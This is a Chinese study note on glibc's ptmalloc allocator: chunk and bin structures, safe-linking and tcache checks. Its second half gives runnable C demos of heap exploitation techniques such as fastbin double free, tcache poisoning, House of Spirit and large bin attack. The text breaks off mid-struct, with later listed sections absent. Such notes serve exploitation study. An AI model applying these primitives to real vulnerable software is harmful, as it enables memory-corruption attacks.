- [内存管理器(ptmalloc)的学习](#内存管理器ptmalloc的学习)
  - [chunk的具体实现](#chunk的具体实现)
  - [堆空闲管理结构(bins)](#堆空闲管理结构bins)
    - [fast bin](#fast-bin)
      - [fastbin的安全机制](#fastbin的安全机制)
    - [small bin](#small-bin)
    - [large bin](#large-bin)
    - [unsorted bin](#unsorted-bin)
    - [tcache bin( \>=glibc 2.26 )](#tcache-bin-glibc-226-)
      - [tcache bin的安全机制](#tcache-bin的安全机制)
    - [top chunk](#top-chunk)
    - [last remainder](#last-remainder)
  - [漏洞](#漏洞)
    - [Chunk Extend and Overlapping](#chunk-extend-and-overlapping)
      - [对 inuse 的 chunk 进行 Extend](#对-inuse-的-chunk-进行-extend)
      - [对 free 的 chunk 进行 extend](#对-free-的-chunk-进行-extend)
      - [通过 extend 进行 overlapping](#通过-extend-进行-overlapping)
    - [unlink](#unlink)
    - [Fastbin Attack](#fastbin-attack)
      - [Fastbin Double Free](#fastbin-double-free)
      - [House Of Spirit](#house-of-spirit)
      - [Alloc to Stack和Arbitrary Alloc](#alloc-to-stack和arbitrary-alloc)
    - [unsorted bin attack](#unsorted-bin-attack)
    - [Large Bin Attack](#large-bin-attack)
    - [tcache bin](#tcache-bin)
      - [tcache poisoning](#tcache-poisoning)
      - [tcache dup](#tcache-dup)
      - [tcache perthread corruption](#tcache-perthread-corruption)
      - [tcache house of spirit](#tcache-house-of-spirit)
      - [tcache stashing unlink attack](#tcache-stashing-unlink-attack)
    - [House of einherjar](#house-of-einherjar)
    - [House Of Force](#house-of-force)
    - [House of Lore](#house-of-lore)
    - [House of Orange](#house-of-orange)
  - [other](#other)
    - [通过 `main_arena`地址获取 `glibc`基地址的偏移](#通过-main_arena地址获取-glibc基地址的偏移)
    - [\_\_malloc\_hook和\_\_free\_hook](#__malloc_hook和__free_hook)
  - [struct malloc\_state (glibc-2.35)](#struct-malloc_state-glibc-235)
  - [\_\_libc\_malloc (glibc-2.35)](#__libc_malloc-glibc-235)
  - [\_\_libc\_free (glibc-2.35)](#__libc_free-glibc-235)
  - [\_int\_malloc过程](#_int_malloc过程)
  - [\_int\_free过程](#_int_free过程)

# 内存管理器(ptmalloc)的学习

## chunk的具体实现

```C
# define INTERNAL_SIZE_T size_t
struct malloc_chunk {

    INTERNAL_SIZE_T      mchunk_prev_size;    // 如果前面一个物理相邻的chunk是空闲的, 则表示其大小, 否则用于储存前一个chunk的数据
    INTERNAL_SIZE_T      mchunk_size;         // 当前chunk的大小, 低三位作为flag, 意义
  
    如下:
    /*
        A : 倒数第三位表示当前chunk是否属于主线程:1表示不属于主线程, 0表示属于主线程
        M : 倒数第二位表示当前chunk是从mmap(1)[多线程]分配的，还是从brk(0)[子线程]分配的
        P : 最低为表示前一个chunk是否在使用中, 1表示在使用, 0表示是空闲的
            通常堆中的第一个chunk的P位是1, 以便于防止访问前面的非法内存
    */

    /*
        1.用户使用的内存从这里开始分配
        2.只有在free之后, 以下数据才有效
    */
    struct malloc_chunk* fd;            // 当chunk空闲时才有意义,记录后一个空闲chunk的地址
    struct malloc_chunk* bk;            // 同上,记录前一个空闲chunk的地址

    /* 仅用于large bin */
    struct malloc_chunk* fd_nextsize;   // 指向比当前chunk大的第一个空闲chunk
    struct malloc_chunk* bk_nextsize;   // 指向比当前chunk小的第一个空闲chunk
};
```

`chunk` 的大小必须是 `2 * SIZE_SZ`的整数倍

- __32位下__:`SIZE_SZ = 4`, 因此 `chunk`大小为 `0x8`的整数倍, 最小的 `chunk`为 `0x10`
- __64位下__:`SIZE_SZ = 8`, 因此 `chunk`大小为 `0x10`的整数倍, 最小的 `chunk`为 `0x20`

## 堆空闲管理结构(bins)

每类 `bin` 的内部会有多个互不相关的链表来保存 __不同大小__ 的 `chunk`
其中，对于 `small bin``large bin``unsorted bin`, ptmalloc将它们全部放在 `malloc_state->bins` 中:

```C
#define NBINS 128
typedef struct malloc_chunk* mchunkptr;

mchunkptr bins[NBINS * 2 - 2];
```

每个双向链表的索引需要占用 __两个下标__

- 第 `1` 个索引存放 `unsorted bin`
- 第 `2 ~ 63` 个索引存放 `small bin`, `small bin`一共有 `62`条双向链表
- 第 `64 ~ 126` 个索引存放 `large bin`, `large bin`一共有 `63`条双向链表

 注意索引和下标的转换:

```C
// i:索引
#define bin_at(m, i) \
    (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2])) - offsetof (struct malloc_chunk, fd))
```

### fast bin

32位下存放 `0x10 ~ 0x40`字节的 `chunk`
64位下存放 `0x20 ~ 0x80`字节的 `chunk`
`fast bin`按单链表结构, `fd`指向下一堆块, 采用 `LIFO`机制
防止释放时对 `fast bin`合并, 下一堆块的p标志位为 `1`

#### fastbin的安全机制

- 在glibc-2.32版本中，对 `fastbin`的 `fd`指针进行了加密，具体加密过程如下代码

```C
// 使用fd的地址作为密钥，加密fd的值
// ((((size_t) &ptr) >> 12) ^ ((size_t) ptr)))
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

```C
// 示例
#include <stdio.h>
#include <stdlib.h>

// ((((size_t) &ptr) >> 12) ^ ((size_t) ptr)))
#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)

int main()
{
    size_t *a, *b;

    // 令 fast bin -> a -> b
    a = malloc(0x10);
    malloc(0x10);
    b = malloc(0x10);
    malloc(0x10);
    free(b);
    free(a);

    size_t a_fd = (size_t)*a;         // chunk a 的 fd 值
    size_t a_fd_addr = (size_t)a;     // chunk a 的 fd 地址
    size_t b_addr = (size_t)b - 0x10; // chunk b 的地址

    printf("a->fd        = %p\n", a_fd);
    printf("b 地址       = %p\n\n", b_addr);

    printf("b 地址加密后 = %p\n", PROTECT_PTR(a_fd_addr, b_addr));
    printf("a->fd 解密后 = %p\n", PROTECT_PTR(a_fd_addr, a_fd));

    return 0;
}
```

- `_int_free` 会检测 `fastbin` 的 `double free`，即验证 `main_arena` 中 `fastbinsY` 对应大小的链表头指向的 `chunk` 是否和即将 `free` 的 `chunk`相同。因此，我们在释放同一个 `chunk`时，需要有其他 `chunk`间隔
- 对于即将从 `fastbin` 中取出的 `chunk`，会检查其地址是否对齐
- 对于即将从 `fastbin` 中取出的 `chunk`，会检查其 `size` 大小是否符合该 `bin` 上的大小

### small bin

双向链表, 采用FIFO策略
一共有 `62`条双向链表

### large bin

双向链表, 采用FIFO策略
`large bins`中一共包括 `63`个 `bin`, 每个 `bin`中的 `chunk`的大小不一致, 处于一定区间范围内

`large bin`的每个bin中会有存放不同大小的表, 表头的`fd`指针会指向相同或者下一个较小的表头, `fd_nextsize`会指向下一个较小的表头[large bin](./large%20bin.drawio)

### unsorted bin

双向链表, 采用FIFO策略
`free`的 `chunk`大小如果大于 `0x80`(64位下), 并且不与 `top chunk`相连, 则会放到 `unsorted bin`上
当一个 `chunk`被分割后, 如果剩下的部分大于 `MINSIZE`, 也会被放到 `unsorted bin`中

### tcache bin( >=glibc 2.26 )

`tcache`是一个线程特定的数据结构, 每个线程都有自己的 `tcache`, 它包含了一组 `tcache bin`
使用 `export GLIBC_TUNABLES=glibc.malloc.tcache_count=0`禁用 `tcache`
注意，`tcache bin` 中 `chunk` 的 `next` 指向 `mem`

- `tcache`的两个重要的结构体如下:

```C
# define TCACHE_MAX_BINS 64
// 链接空闲的chunk结构体
typedef struct tcache_entry
{
    // next指向下一个具有相同大小的chunk
    // 与fast bin不同的是, chunk的fd指向的是下一个chunk的data部分
    struct tcache_entry *next;
    // 防止double free
    uintptr_t key;
} tcache_entry;

// 每个线程都会有一个tcache_perthread_struct用于管理tcache链表
// 这个结构体位于heap段的起始位置
typedef struct tcache_perthread_struct
{
    // counts记录了tcache_entry链上空闲chunk的数量
    // 每条tcache_entry链最多可以有7个chunk
    char counts[TCACHE_MAX_BINS];
  
    // 用单向链表的方式链接了相同大小的处于空闲状态的chunk
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

1. 申请的内存块符合 `fastbin` 大小时并且在 `fastbin` 内找到可用的空闲块时，会把该 `fastbin` 链上的其他内存块放入 `tcache` 中。
2. 其次，申请的内存块符合 `smallbin` 大小时并且在 `smallbin` 内找到可用的空闲块时，会把该 `smallbin` 链上的其他内存块放入 `tcache` 中。
3. 当在 `unsorted bin` 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 `tcache` 中，继续处理。
4. `tcache` 取出：在内存申请的开始部分，首先会判断申请大小块，在 `tcache` 是否存在，如果存在就直接从 `tcache` 中摘取，否则再使用 `_int_malloc` 分配。
5. 在循环处理 `unsorted bin` 内存块时，如果达到放入 `unsorted bin` 块最大数量，会立即返回。默认是 0，即不存在上限。
6. 在循环处理 `unsorted bin` 内存块后，如果之前曾放入过 `tcache` 块，则会取出一个并返回。

#### tcache bin的安全机制

在 `glibc 2.29` 版本中，开始对 `tcache bin` 的`double free`检查，及检查`tcache_entry->key`

在 `glibc 2.30` 版本中，开始在 `__libc_malloc` 从 `tcache bin` 中分配 `chunk` 时检查对应链上的 `count` 是否大于 `0`

在 `glibc 2.32` 版本中，开始对 `tcache bin` 中 `chunk` 的 `next` 指针的加密，加密过程同[fastbin的安全机制](#fastbin的安全机制)

### top chunk

`prev_inuse`比特位始终为 `1`

### last remainder

`chunk`切割后, 剩下的小于 `MINSIZE`的部分

## 漏洞

### Chunk Extend and Overlapping

通过修改 `chunk`的 `size`和 `prev_size`后通过释放和申请堆块，使得后面申请的堆块可以扩展和覆盖其他堆块

#### 对 inuse 的 chunk 进行 Extend

修改 `chunk` 的 `size`，使其覆盖掉物理相邻的后一个 `chunk` ，在 `free` 后会放入相应大小的 `bin` 中，然后重新分配时就会将后一个物理相邻的 `chunk` 也分配出来

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
    size_t *p1, *p2;

    p1 = malloc(0x80); // 分配第一个0x80的chunk1
    malloc(0x10);      // 分配第二个0x10的chunk2

    *(p1 - 1) = 0xb1; // 修改chunk1的size为0xb1

    free(p1);          // 将 chunk1 进入 unsorted bin
    p2 = malloc(0xA0); // 再次分配出来的chunk就是chunk1+chunk2

    printf("p1: %p\n", p1);
    printf("p2: %p\n", p2);
    return 0;
}
```

#### 对 free 的 chunk 进行 extend

与对 `inuse` 的 `chunk` 进行 `Extend` 原理基本一样
注意，只适用于`glibc-2.29`之前的版本，`glibc-2.29`开始会在从`unsorted bin`取出`chunk`时对`size`, `prev_size` 和 `inuse` 进行检查

```C
// 此示例应当在glibc2.29之前的版本中运行
#include <stdio.h>
#include <stdlib.h>

int main()
{
    size_t *p1, *p2;

    p1 = malloc(0x80); // 分配第一个0x80的chunk1
    malloc(0x10);      // 分配第二个0x10的chunk2

    free(p1); // 将 chunk1 进入 unsorted bin

    *(p1 - 1) = 0xb1;  // 修改chunk1的size为0xb1
    p2 = malloc(0xa0); // 再次分配出来的chunk就是chunk1+chunk2

    printf("p1: %p\n", p1);
    printf("p2: %p\n", p2);

    return 0;
}
```

#### 通过 extend 进行 overlapping

通过 `extend` 向后 `overlapping`

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
    size_t *p1, *p2;

    p1 = malloc(0x10); // 分配第1个 0x10 的chunk1
    malloc(0x10);      // 分配第2个 0x10 的chunk2
    malloc(0x10);      // 分配第3个 0x10 的chunk3

    *(p1 - 1) = 0x61;   // 修改chunk1的size为0x61
    free(p1);           // 将其释放后放入0x61大小的tcache bin或fast bin中
    p2 = malloc(0x50);  // 申请0x60大小的chunk将其分配出来，即可控制chunk2和chunk3内容

    return 0;
}
```

通过 `extend` 向前 `overlapping`
`glibc-2.29`及其之后的`unlink`会检查`size`和`prev_size`是否相等, 利用起来更加麻烦

```C
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    size_t *p1, *p2;
    p1 = malloc(0x80); // chunk1
    malloc(0x10);      // chunk2
    malloc(0x10);      // chunk3
    p2 = malloc(0x80); // chunk4
    malloc(0x10);      // 防止与top合并

    free(p1); // 为unlink设置fd和bk

    // 2.29及其之后的unlink会检查size和prev_size是否相等, 需要加上这段代码
    *(p1 - 1) = 0x91 + 0x40;

    *(p2 - 1) = 0x90;   // 修改inuse域
    *(p2 - 2) = 0xd0;   // 修改pre_size域
    free(p2);           // unlink进行前向extend
    p2 = malloc(0x150); // 将chunk1, chunk2, chunk3, chunk4分配出来

    return 0;
}
```

### unlink

```C
static void
unlink_chunk (mstate av, mchunkptr p)
{
    // 检查当前块的大小是否等于下一个块的 prev_size 字段
    if (chunksize (p) != prev_size (next_chunk (p)))
        malloc_printerr ("corrupted size vs. prev_size");

    // 获取当前块的前向指针和后向指针
    mchunkptr fd = p->fd;
    mchunkptr bk = p->bk;

    // 检查前向指针的后向指针是否指向当前块，以及后向指针的前向指针是否指向当前块
    if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
        malloc_printerr ("corrupted double-linked list");

    // 从链表中移除，将前向指针的后向指针设置为后向指针，将后向指针的前向指针设置为前向指针
    fd->bk = bk;
    bk->fd = fd;
    // 如果当前块的大小不在 smallbin 的范围内，并且当前块的 fd_nextsize 字段不为 NULL
    // 那么需要处理 nextsize 链表
    if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
    {
        // 检查 nextsize 链表的完整性
        if (p->fd_nextsize->bk_nextsize != p
              || p->bk_nextsize->fd_nextsize != p)
            malloc_printerr ("corrupted double-linked list (not small)");

        // 如果前向指针的 fd_nextsize 字段为 NULL
        if (fd->fd_nextsize == NULL)
        {
            // 如果当前块的 fd_nextsize 字段指向自己
            // 那么将前向指针的 fd_nextsize 和 bk_nextsize 字段都设置为前向指针自己
            if (p->fd_nextsize == p)
                fd->fd_nextsize = fd->bk_nextsize = fd;
            else
            {
                // 否则，将前向指针的 fd_nextsize 和 bk_nextsize 字段设置为当前块的 fd_nextsize 和 bk_nextsize 字段
                // 并将当前块的 fd_nextsize 和 bk_nextsize 字段的 bk_nextsize 和 fd_nextsize 字段设置为前向指针
                fd->fd_nextsize = p->fd_nextsize;
                fd->bk_nextsize = p->bk_nextsize;
                p->fd_nextsize->bk_nextsize = fd;
                p->bk_nextsize->fd_nextsize = fd;
            }
        }
        else
        {
            // 如果前向指针的 fd_nextsize 字段不为 NULL
            // 那么将当前块的 fd_nextsize 和 bk_nextsize 字段的 bk_nextsize 和 fd_nextsize 字段设置为前向指针的 fd_nextsize 字段
            p->fd_nextsize->bk_nextsize = p->bk_nextsize;
            p->bk_nextsize->fd_nextsize = p->fd_nextsize;
        }
    }
}
```

利用过程:

- 有一个指向上一个 `fake chunk` 的用户指针 `ptr`
- 设置当前 `chunk`的 `p`标准位为 `0` 和 `prev_size`
- 设置上一个 `fake chunk`的 `fd = ptr - 0x18`, `bk = ptr - 0x10`和 `size`
- `free`当前 `chunk`，即可使 `ptr` 指向 `ptr - 0x18`

### Fastbin Attack

#### Fastbin Double Free

> 多次释放同一个 `chunk`到 `fastbin`，由于保护的存在，不能连续释放同一个 `chunk`到 `fastbin`，可以在之间隔一个 `chunk`

比如:释放 `chunk1`，释放 `chunk2`，释放 `chunk1`，那么此时fastbin如下:

- `main_arena`->`fastbinsY`→`chunk1`→`chunk2`→`chunk1`→`chunk2`→...

此时释放申请一个 `chunk`后修改 `chunk1`的 `fd`指向 `data`，然后再申请两次 `chunk`后，第三次申请 `chunk`即可获取 `data`
__注意 `data`的 `size`必须满足当前 `fastbin`的大小__
具体保护请见[fastbin的安全机制](#fastbin的安全机制)
示例:

```C
#include <stdio.h>
#include <stdlib.h>

#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)

int main(void)
{
    size_t stack[4];
    size_t *chunk1, *chunk2;
    printf("stack: %p\n", stack);

    // 构建Fastbin Double Free
    chunk1 = malloc(0x10);
    chunk2 = malloc(0x10);
    free(chunk1);
    free(chunk2);
    free(chunk1);

    // 构建目标chunk
    stack[0] = 0;
    stack[1] = 0x21;

    // 分配出目标chunk
    chunk1 = malloc(0x10);                            // chunk1
    *chunk1 = PROTECT_PTR(chunk1, (size_t)&stack[0]); // 修改chunk1->fd -> &chunk[0]
    chunk2 = malloc(0x10);                            // chunk2
    malloc(0x10);                                     // chunk1
    printf("chunk: %p\n", malloc(0x10) - 0x10);       // stack

    return 0;
}
```

#### House Of Spirit

House Of Spirit指在目标位置伪造chunk，释放后重新申请然后控制该区域，有点像 `Chunk Extend and Overlapping`
伪造 `fake chunk`时需要注意:

- `fake chunk` 的 `ISMMAP` 位不能为 `1`
- `fake chunk` 地址需要对齐(`glibc 2.32`开始)
- `fake chunk` 的 `size` 大小需要满足对应的 `fastbin` 的需求
- `fake chunk` 的物理相邻的下一个chunk大小满足大于 `2 * SIZE_SZ` 且小于 `av->system_mem`

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
    size_t fake_chunks[6];

    fake_chunks[1] = 0x20; // size
    fake_chunks[5] = 0x21; // 物理相连的chunk的size满足大于 2 * SIZE_SZ 且小于 av->system_mem

    free(&fake_chunks[2]); // 将fake_chunks[2]加入到fast bin中
    printf("fake_chunk : %p\n", malloc(0x10));

    return 0;
}
```

#### Alloc to Stack和Arbitrary Alloc

劫持 `fastbin` 链表中 `chunk` 的 `fd` 指针，把 `fd` 指针指向我们想要分配的地方

```C
#include <stdio.h>
#include <stdlib.h>

#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)

int main()
{
    size_t fake_chunk[4] = {0};
    size_t *p;

    fake_chunk[1] = 0x21;                      // 设置size
    fake_chunk[2] = REVEAL_PTR(fake_chunk[2]); // 将fd设置为0, printf可能会调用malloc_consolidate访问fd指向的chunk

    p = malloc(0x10); // 向fast bin放入chunk
    free(p);

    *p = PROTECT_PTR(p, (size_t)&fake_chunk); // 将chunk的fd指向fake_chunk

    malloc(0x10);
    printf("fake_chunk : %p\n", malloc(0x10));

    return 0;
}

```

### unsorted bin attack

```C
victim = unsorted_chunks (av)->bk;
bck = victim->bk;   //  bck = unsorted_chunks (av)->bk-bk
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

我们控制释放后放入`unsorted bin` 的 `chunk`的 `bk`指针指向`target - 0x10`的地方，申请空间将第一个`chunk`取出后即可将该数据的值设置为 `main_arena-bins - 0x10` 的地址

__在glibc-2.28及其以后, 会检查`target`是否指向被取掉的`chunk`__

### Large Bin Attack

修改任意地址的值为新放入chunk的地址

示例1：

```C
// 从fd放入chunk
#include <stdio.h>
#include <stdlib.h>

int main()
{
    unsigned long stack_1 = 0;
    unsigned long stack_2 = 0;

    unsigned long *p1 = malloc(0x320);
    malloc(0x20);
    unsigned long *p2 = malloc(0x400);
    malloc(0x20);
    unsigned long *p3 = malloc(0x400);
    malloc(0x20);

    free(p1); // 用于将unsorted bin中的large bin大小的chunk放入large bin
    free(p2); // 用于构造chunk

    malloc(0x90); // 将构造chunk放入large bin

    free(p3); // 向unsorted bin中放入chunk

    p2[-1] = 0x3f1;                         // 构造chunk
    p2[0] = 0;                              // fd
    p2[1] = (unsigned long)(&stack_1 - 2);  // bk
    p2[2] = 0;                              // fd_nextsize
    p2[3] = (unsigned long)(&stack_2 - 4);  // bk_nextsize

    malloc(0x90);

    printf("stack_1 (%p): %p\n", &stack_1, (void *)stack_1);
    printf("stack_2 (%p): %p\n", &stack_2, (void *)stack_2);

    return 0;
}
```

从 `glibc-2.30` 版本开始对`fd`插入的`chunk`的 __跳表指针__ 和 __双向链表指针__ 检查

示例2：

```C
// 从bk放入chunk
#include <stdio.h>
#include <stdlib.h>

int main()
{
    unsigned long stack = 0;

    unsigned long *p1 = malloc(0x320);
    malloc(0x20);
    unsigned long *p2 = malloc(0x400);
    malloc(0x20);
    unsigned long *p3 = malloc(0x400);
    malloc(0x20);

    free(p1); // 用于将unsorted bin中的large bin大小的chunk放入large bin
    free(p2); // 用于构造chunk

    malloc(0x90); // 将构造chunk放入large bin

    free(p3); // 向unsorted bin中放入chunk

    p2[-1] = 0x421;                         // 构造chunk
    p2[0] = 0;                              // fd
    p2[1] = 0;                              // bk
    p2[2] = 0;                              // fd_nextsize
    p2[3] = (unsigned long)(&stack - 4);    // bk_nextsize

    malloc(0x90);

    printf("stack (%p): %p\n", &stack, (void *)stack);

    return 0;
}
```

目前截止到 `glibc2.38` 依然可以使用

### tcache bin

#### tcache poisoning

修改 `tcache bin` 的 `next` 指针，使得可以 `malloc` 到任何地址
需要注意:

- 地址对齐
- `next`指针指向的是 `mem`，而不是 `chunk`, 可以使用 `chunk2mem`进行转换
- 注意在 `glibc 2.32`引入了对 `next`指针的加密, 同[fastbin的安全机制](#fastbin的安全机制)
- `tcache bin`在取出 `chunk`时会使用 `count`检查对应 `tcache bin`链上是否有 `chunk`, 同[fastbin的安全机制](#fastbin的安全机制)

如下:

```C
#include <stdio.h>
#include <stdlib.h>
// 加密
#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))

size_t fake_chunk;
int main()
{
    size_t *a = malloc(0x80); // 将a指针指向fake_chunk
    size_t *b = malloc(0x80); // 用于tcache bin中count的计数
    free(b);                  // 先将b指针放入tcache bin中使得count计数为1
    free(a);
    *a = (size_t)PROTECT_PTR(a, &fake_chunk); // 将fake_chunk的地址加密后存入a[0]中
    // tcache -> a -> fake_chunk
    printf("%p\n", &fake_chunk);
    printf("%p\n", malloc(0x80)); // 获取a
    printf("%p\n", malloc(0x80)); // 获取fake_chunk

    return 0;
}
```

#### tcache dup

可以通过 `double free`申请两次或多次同一个堆块
但是在 `glibc-2.29`加入了 `key`，`free`后会设置 `key`，第二次 `free`如果检测到了 `key`那么就会报错

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main()
{
    char *a;
    a = malloc(0x10);    // 申请一个chunk
    free(a);             // 放入tcache bin
    memset(a + 8, 0, 8); // 修改key用于绕过tcache double free检查
    free(a);             // 再次free

    printf("a: %p\n", a);
    printf("new chunk: %p\n", malloc(0x10));
    printf("new chunk: %p\n", malloc(0x10));
    return 0;
}
```

#### tcache perthread corruption

通过某些手段控制tcache_perthread_struct结构体，来控制从而控制整个tcache bin
比如使用tcache poisoning获取tcache_perthread_struct

#### tcache house of spirit

和house of spirit类似，在指定地址分配内存，但是要注意count计数器

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
    size_t fake_chunk[5];
    malloc(1);              // 设置count计数器为1

    fake_chunk[0] = 0;      // prev_size
    fake_chunk[1] = 0x21;   // size

    free(fake_chunk+2);

    printf("fake_chunk = %p\nnew chunk = %p\n", fake_chunk + 2, malloc(0x10));
    return 0;
}
```

#### tcache stashing unlink attack

向任意地址写堆地址或分配任意地址
`__libc_calloc`是直接调用 `_int_malloc`分配内存，并且会清空内存
原理就是从我们的 `small bin`中申请一块内存，剩下的 `small bin`会放入 `tcache bin`中
我们只需要伪造 `small bin`的 `bk`指针，指向我们的 `fake chunk`，那么就会将这个 `fake chunk`就会放入 `tcache bin`，并且fake chunk的fd就会指向bin(main_arena中small bin对应大小的那对首尾指针-0x10字节的位置)，然后申请内存时就可以直接分配出 `fake chunk`

> 注意:

- 我们需要让 `tcache bin`剩余的 `chunk`和我们想要放进去的 `chunk`数量相等，并且 `fake chunk`在最后放入
- 在伪造时，需要让 `fake chunk`的 `bk`指向一个可写内存，准确来说，是 `bk->fd`可写

部分代码如下:

```C
// 循环将smallbin中剩下的块放入tcache bin，需要通过counts控制循环次数
// 因此需要让`tcache bin`剩余的`chunk`和我们想要放进去的`chunk`数量相等，并且`fake chunk`在最后放入
while (tcache->counts[tc_idx] < mp_.tcache_count 
        && (tc_victim = last(bin)) != bin)
{
    if (tc_victim != 0)
    {
        bck = tc_victim->bk;
        set_inuse_bit_at_offset(tc_victim, nb);
        if (av != &main_arena)
            set_non_main_arena(tc_victim);

        // 核心部分
        bin->bk = bck;
        bck->fd = bin;

        // 将当前chunk放入tcache bin
        tcache_put(tc_victim, tc_idx);
    }
}
```

实例:

```C
#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long fake_chunk[10] = { 0 };
    unsigned long *chunk[10] = { 0 };

    // 将fake_chunk的bk指针指向一个可写的地址
    fake_chunk[3] = &fake_chunk[3];

    // 创建2 + 7个chunk
    for(int i = 0;i < 9;i++)
        chunk[i] = (unsigned long*)malloc(0x80);
    // 释放6个chunk
    for(int i = 3;i < 9;i++)
        free(chunk[i]);

    // 0和1顺序相反是为了防止1和2 chunk 进行合并
    free(chunk[1]); // tcache bin
    free(chunk[0]); // unsorted bin
    free(chunk[2]); // unsorted bin

    malloc(0x90);   // 将0和2 chunk 放入 smallbin

    // 在tcache bin中获取两个位置用于存放0和2 chunk
    malloc(0x80);
    malloc(0x80);

    // 因为FIFO策略，所以先获取的是0 chunk，然后是2 chunk，因此安全机制会/ 再次申请chunk时就会获取fake_chunk的地址检测0 chunk，合并时会放过2 chunk
    chunk[2][1] = (unsigned long)fake_chunk;    // 将2 chunk的bk指针指向fake_chunk

    calloc(1,0x80); // 将fake_chunk放入tcache bin

    // 再次申请chunk时就会获取fake_chunk的地址
    printf("%p\n%p\n", malloc(0x80), fake_chunk);
    return 0;
}
```

### House of einherjar

和 `Chunk Extend and Overlapping`非常相似，但是 `Chunk Extend and Overlapping`绕过 `unlink`是将要合并的 `chunk`进行 `free`，这样才能将 `fd`和 `bk`设置为合适的值，`Chunk Extend and Overlapping`将 `fd`和 `bk`都指向了 `chunk`，这就需要提前知道将要合并的 `chunk`的地址，比如:
`fake_chunk = p64(0x0) + p64(0x81) + p64(fake_chunk) + p64(fake_chunk)`
这样 `unlink`时，`fd->bk`和 `bk->fd`依然指向 `fake_chunk`

### House Of Force

将 `top chunk` 的 `size` 设置为一个极大的值，比如-1
然后通过分配空间将top指向想要的地址，然后将目标空间分配出来

使用 `House Of Force`需要获取以下条件:

- 能够以控制 `top chunk` 的 `size` 域
- 能够自由地控制堆分配尺寸的大小

比如设置 `top chunk`为 `0xffffffffffffffff`后，目前 `top chunk = 0x20000`，想要控制的空间是 `0x10000`
那么如下设置:

```C
// 0x1000-0x2000是top到目标空间的差，-0x10是需要去除chunk头
malloc( ( 0x10000 - 0x20000 ) - 0x10 );
char *p = malloc(0x10);
```

### House of Lore

`Small Bin`的机制在目标区域申请 `chunk`, 过程如下:

- 创建一个 `small`大小的 `chunk1`用于连接 `bin`和 `fake chunk`
- 现在目标区域构建 `fake chunk`，使 `fake chunk`的 `fd`指向 `chunk1`，`bk`指向另一个可控 `chunk2`
- 设置chunk2的fd指针指向 `fake chunk`

测试:

```C
#include <stdio.h>
#include <stdlib.h>
typedef unsigned long ptr;
int main()
{
    ptr* fake_chunk[4] = { 0 };
    ptr* ctrl_space[4] = { 0 };
  
    ptr *mem = malloc(0x100);
    ptr *chunk = mem - 2;
  
    fake_chunk[0] = 0;
    fake_chunk[1] = 0;
    fake_chunk[2] = chunk;              // fd 指向 chunk
    fake_chunk[3] = ctrl_space;         // bk 指向可控区域ctrl_space

    ctrl_space[2] = (ptr*)fake_chunk;   // fd 指向 fake_chunk
  
    malloc(0x100);                      // 防止与top chunk合并
  
    free(mem);                          // 释放chunk，放入unsorted bin
    malloc(0x1000);                     // 将其放入small bin
    mem[1] = (ptr)fake_chunk;           // 将chunk->bk指向fake_chunk
  
    malloc(0x100);                      // 将chunk取出
  
    printf("p4:             %p\n", (char*)malloc(0x100) - 0x10);  // 获取fake_chunk
    printf("stack_buffer_1: %p\n", fake_chunk);
  
    return 0;
}
```

需要满足House of Lore的条件:

1. 可以修改fakechunk的fd和bk指针
2. 有一块可控区域

### House of Orange

## other

### 通过 `main_arena`地址获取 `glibc`基地址的偏移

通过 `ida`找到 `malloc_trim`函数，有一段 `mstate ar_ptr = &main_arena;`可以获取 `main_arena`地址

```C
int
__malloc_trim (size_t s)
{
    int result = 0;

    if (__malloc_initialized < 0)
        ptmalloc_init ();

    mstate ar_ptr = &main_arena;
    do
    {
        __libc_lock_lock (ar_ptr->mutex);
        result |= mtrim (ar_ptr, s);
        __libc_lock_unlock (ar_ptr->mutex);

        ar_ptr = ar_ptr->next;
    }
    while (ar_ptr != &main_arena);

    return result;
}
```

### __malloc_hook和__free_hook

`__malloc_hook`和 `__free_hook`这两个钩子在 `glibc 2.24`版本开始被标记为废弃，在 `glibc 2.34`版本中已经被彻底移除了

## struct malloc_state (glibc-2.35)

```C
# define INTERNAL_SIZE_T size_t
struct malloc_state
{
    // 用于序列化访问的互斥锁(64位下40字节，32位下24字节)
    __libc_lock_define (, mutex);

    // 标志位（以前在 max_fast 中）
    int flags;

    // 如果 fastbin 包含最近插入的空闲块，则设置此字段。注意，这是一个布尔值，但并非所有目标都支持对布尔值的原子操作。
    int have_fastchunks;

    // fast bins
    mfastbinptr fastbinsY[NFASTBINS];

    // top chunk
    mchunkptr top;

    // 最近一次小请求分割的剩余部分
    mchunkptr last_remainder;

    // bins
    mchunkptr bins[NBINS * 2 - 2];

    // bins 的位图
    unsigned int binmap[BINMAPSIZE];

    // 下一个malloc_state
    struct malloc_state *next;

    // 用于空闲 arenas 的链表。访问此字段的操作由 arena.c 中的 free_list_lock 进行序列化。
    struct malloc_state *next_free;

    // 附加到此 arena 的线程数。如果 arena 在空闲列表中，则为 0。访问此字段的操作由 arena.c 中的 free_list_lock 进行序列化。
